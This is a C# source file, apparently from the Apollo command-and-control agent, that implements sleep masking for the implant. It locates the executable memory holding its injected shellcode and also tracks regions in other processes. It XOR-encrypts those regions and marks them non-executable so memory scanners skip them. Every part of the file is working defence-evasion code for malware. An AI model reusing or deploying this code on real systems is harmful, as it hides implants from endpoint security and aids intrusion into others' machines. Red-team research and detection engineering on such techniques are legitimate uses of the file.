using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using ApolloInterop.Classes.Api;
using ApolloInterop.Interfaces;

namespace ApolloInterop.Classes.Core
{
    public class SleepMaskingManager : ISleepMaskingManager
    {
        private struct TrackedRegion
        {
            public IntPtr ProcessHandle;
            public IntPtr BaseAddress;
            public int Size;
            public byte[] XorKey;
            public bool IsMasked;
            public bool IsSelfRegion;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        private delegate int VirtualQueryDelegate(
            IntPtr lpAddress,
            out MEMORY_BASIC_INFORMATION lpBuffer,
            int dwLength);

        private delegate bool VirtualProtectDelegate(
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        private delegate bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        private delegate bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesRead);

        private delegate bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);

        private delegate IntPtr GetCurrentProcessDelegate();

        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_COMMIT = 0x1000;

        private readonly ConcurrentDictionary<IntPtr, TrackedRegion> _regions = new ConcurrentDictionary<IntPtr, TrackedRegion>();
        private readonly VirtualProtectEx _pVirtualProtectEx;
        private readonly ReadProcessMemory _pReadProcessMemory;
        private readonly WriteProcessMemory _pWriteProcessMemory;
        private readonly VirtualQueryDelegate _pVirtualQuery;
        private readonly VirtualProtectDelegate _pVirtualProtect;
        private readonly GetCurrentProcessDelegate _pGetCurrentProcess;
        private readonly object _lock = new object();

        public SleepMaskingManager(IAgent agent)
        {
            _pVirtualProtectEx = agent.GetApi().GetLibraryFunction<VirtualProtectEx>(Library.KERNEL32, "VirtualProtectEx");
            _pReadProcessMemory = agent.GetApi().GetLibraryFunction<ReadProcessMemory>(Library.KERNEL32, "ReadProcessMemory");
            _pWriteProcessMemory = agent.GetApi().GetLibraryFunction<WriteProcessMemory>(Library.KERNEL32, "WriteProcessMemory");
            _pVirtualQuery = agent.GetApi().GetLibraryFunction<VirtualQueryDelegate>(Library.KERNEL32, "VirtualQuery");
            _pVirtualProtect = agent.GetApi().GetLibraryFunction<VirtualProtectDelegate>(Library.KERNEL32, "VirtualProtect");
            _pGetCurrentProcess = agent.GetApi().GetLibraryFunction<GetCurrentProcessDelegate>(Library.KERNEL32, "GetCurrentProcess");
        }

        public void RegisterSelfRegion()
        {
            try
            {
                IntPtr hProcess = _pGetCurrentProcess();
                int mbiSize = Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION));

                // Use the address of a known static method as a starting point
                // to find the executable memory region where Apollo's code lives
                IntPtr probeAddress = Marshal.GetFunctionPointerForDelegate(_pGetCurrentProcess);

                // Walk all committed executable regions that share the same AllocationBase
                // These are the pages that contain our injected shellcode
                MEMORY_BASIC_INFORMATION probeInfo;
                if (_pVirtualQuery(probeAddress, out probeInfo, mbiSize) == 0)
                    return;

                IntPtr allocationBase = probeInfo.AllocationBase;
                List<Tuple<IntPtr, int>> executableRegions = new List<Tuple<IntPtr, int>>();

                // Scan from the allocation base forward to find all committed executable pages
                IntPtr currentAddress = allocationBase;
                while (true)
                {
                    MEMORY_BASIC_INFORMATION mbi;
                    if (_pVirtualQuery(currentAddress, out mbi, mbiSize) == 0)
                        break;

                    // Stop if we've moved past our allocation
                    if (mbi.AllocationBase != allocationBase && executableRegions.Count > 0)
                        break;

                    if (mbi.AllocationBase == allocationBase &&
                        (mbi.State & MEM_COMMIT) != 0 &&
                        IsExecutable(mbi.Protect))
                    {
                        executableRegions.Add(new Tuple<IntPtr, int>(mbi.BaseAddress, (int)mbi.RegionSize));
                    }

                    // Advance to next region
                    long next = (long)currentAddress + (long)mbi.RegionSize;
                    if (next <= (long)currentAddress)
                        break;
                    currentAddress = (IntPtr)next;
                }

                // Register each executable region for sleep masking
                foreach (var region in executableRegions)
                {
                    byte[] key = Guid.NewGuid().ToByteArray();
                    var tracked = new TrackedRegion
                    {
                        ProcessHandle = hProcess,
                        BaseAddress = region.Item1,
                        Size = region.Item2,
                        XorKey = key,
                        IsMasked = false,
                        IsSelfRegion = true
                    };
                    _regions[region.Item1] = tracked;
                }
            }
            catch
            {
                // Silently fail - self-masking is best-effort
            }
        }

        public void RegisterRegion(IntPtr hProcess, IntPtr baseAddress, int size)
        {
            byte[] key = Guid.NewGuid().ToByteArray();
            var region = new TrackedRegion
            {
                ProcessHandle = hProcess,
                BaseAddress = baseAddress,
                Size = size,
                XorKey = key,
                IsMasked = false,
                IsSelfRegion = false
            };
            _regions[baseAddress] = region;

            // Immediately mask the newly registered region to minimize exposure
            MaskSingleRegion(baseAddress);
        }

        public void UnregisterRegion(IntPtr baseAddress)
        {
            _regions.TryRemove(baseAddress, out _);
        }

        public void MaskSingleRegion(IntPtr baseAddress)
        {
            lock (_lock)
            {
                TrackedRegion region;
                if (!_regions.TryGetValue(baseAddress, out region))
                    return;
                if (region.IsMasked)
                    return;

                bool success = region.IsSelfRegion ? DoMaskSelf(ref region) : DoMask(ref region);
                if (success)
                {
                    region.IsMasked = true;
                    _regions[baseAddress] = region;
                }
            }
        }

        public void MaskAllRegions()
        {
            lock (_lock)
            {
                foreach (var kvp in _regions)
                {
                    var region = kvp.Value;
                    if (region.IsMasked)
                        continue;

                    bool success = region.IsSelfRegion ? DoMaskSelf(ref region) : DoMask(ref region);
                    if (success)
                    {
                        region.IsMasked = true;
                        _regions[kvp.Key] = region;
                    }
                }
            }
        }

        public void UnmaskAllRegions()
        {
            lock (_lock)
            {
                foreach (var kvp in _regions)
                {
                    var region = kvp.Value;
                    if (!region.IsMasked)
                        continue;

                    bool success = region.IsSelfRegion ? DoUnmaskSelf(ref region) : DoUnmask(ref region);
                    if (success)
                    {
                        region.IsMasked = false;
                        _regions[kvp.Key] = region;
                    }
                }
            }
        }

        // --- Self-region masking (current process, using Marshal.Copy + VirtualProtect) ---

        private bool DoMaskSelf(ref TrackedRegion region)
        {
            try
            {
                // Flip to RW
                uint oldProtect;
                if (!_pVirtualProtect(region.BaseAddress, (uint)region.Size, PAGE_READWRITE, out oldProtect))
                    return false;

                // Read, XOR, write back in-process
                byte[] buffer = new byte[region.Size];
                Marshal.Copy(region.BaseAddress, buffer, 0, region.Size);
                XorInPlace(buffer, region.XorKey);
                Marshal.Copy(buffer, 0, region.BaseAddress, region.Size);

                // Leave as RW - non-executable so scanners skip it
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool DoUnmaskSelf(ref TrackedRegion region)
        {
            try
            {
                // Already RW from masking - read, XOR decrypt, write back
                byte[] buffer = new byte[region.Size];
                Marshal.Copy(region.BaseAddress, buffer, 0, region.Size);
                XorInPlace(buffer, region.XorKey);
                Marshal.Copy(buffer, 0, region.BaseAddress, region.Size);

                // Restore to RX
                uint oldProtect;
                _pVirtualProtect(region.BaseAddress, (uint)region.Size, PAGE_EXECUTE_READ, out oldProtect);

                return true;
            }
            catch
            {
                return false;
            }
        }

        // --- Remote region masking (other processes, using ReadProcessMemory/WriteProcessMemory) ---

        private bool DoMask(ref TrackedRegion region)
        {
            try
            {
                uint oldProtect;
                if (!_pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, PAGE_READWRITE, out oldProtect))
                    return false;

                byte[] buffer = new byte[region.Size];
                uint bytesRead;
                if (!_pReadProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesRead))
                {
                    _pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, oldProtect, out _);
                    return false;
                }

                XorInPlace(buffer, region.XorKey);

                uint bytesWritten;
                _pWriteProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesWritten);

                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool DoUnmask(ref TrackedRegion region)
        {
            try
            {
                byte[] buffer = new byte[region.Size];
                uint bytesRead;
                if (!_pReadProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesRead))
                    return false;

                XorInPlace(buffer, region.XorKey);

                uint bytesWritten;
                _pWriteProcessMemory(region.ProcessHandle, region.BaseAddress, buffer, (uint)region.Size, out bytesWritten);

                uint oldProtect;
                _pVirtualProtectEx(region.ProcessHandle, region.BaseAddress, (uint)region.Size, PAGE_EXECUTE_READ, out oldProtect);

                return true;
            }
            catch
            {
                return false;
            }
        }

        private static bool IsExecutable(uint protect)
        {
            return (protect & PAGE_EXECUTE_READ) != 0 ||
                   (protect & PAGE_EXECUTE_READWRITE) != 0 ||
                   (protect & 0x10) != 0;  // PAGE_EXECUTE
        }

        private static void XorInPlace(byte[] data, byte[] key)
        {
            int keyLen = key.Length;
            for (int i = 0; i < data.Length; i++)
            {
                data[i] ^= key[i % keyLen];
            }
        }
    }
}
